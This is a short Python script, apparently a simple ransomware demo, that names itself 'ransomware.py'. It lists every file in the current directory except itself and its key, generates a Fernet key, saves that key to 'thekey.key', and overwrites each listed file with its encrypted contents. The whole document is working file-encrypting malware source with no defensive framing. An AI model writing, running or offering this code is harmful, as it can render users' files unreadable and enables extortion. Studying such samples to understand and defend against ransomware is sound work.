import os
from cryptography.fernet import Fernet

#Check Fieles
files = []
for file in os.listdir():
    if file == "ransomware.py" or file == "thekey.key":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

# Start Encrypt

key = Fernet.generate_key()
with open("thekey.key", 'wb') as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypt = Fernet(key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypt)